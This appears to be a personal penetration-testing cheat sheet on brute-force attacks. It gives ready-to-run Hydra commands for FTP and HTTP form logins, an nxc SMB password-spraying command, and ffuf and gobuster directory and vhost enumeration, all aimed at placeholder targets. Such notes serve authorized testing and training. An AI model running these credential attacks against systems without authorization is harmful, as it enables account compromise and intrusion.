# Bruteforce Attacks

## Hydra
```bash
hydra -l jason -P passwords.txt -t 4 -W 3 -o of.txt ftp://$ip
```
With HTTP you will need to get an indicated for a failed sign-in attempt where "Login failed." is
```bash
hydra -L users.txt -P passwords.txt 192.168.0.25 http-post-form "/index.php:usr=^USER^&fm_pwd=^PASS^:Login failed. Wrong Use"
```
```bash
-l      # Single user
-p      # Single password
-L      # User file
-P      # Password file
-t      # Number of parallel tasks (default 16)
-o      # outfile
-W      # wait time for response
-s      # select non-standard port
-e nsr  #  try "n" null password, "s" login as pass and/or "r" reversed login
```
Hydra Supports over 50 protocols including:
```text
smtp, pop3, imap
ftp, sftp, tftp
ssh, telnet, rdp
mssql, mysql
http, https
```

## nxc
nxc also contains support or several protocols, including smb, rdp and ldap
```bash
nxc smb $ip -u users.txt -p passwords.txt --continue-on-success
```

## directory bruteforcing

ffuf
```bash
ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.old -mc 200,301,302,403
```
gobuster
```bash
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old -t 40
```
gobuster can also be used for protocols such as ftp
```bash
gobuster dir -u ftp://$ip -w pslist.txt
```
additionally, gobuster can be used for dns, tftp, vhosts, and more
```bash
gobuster vhost -u http://$ip -w wl.txt
```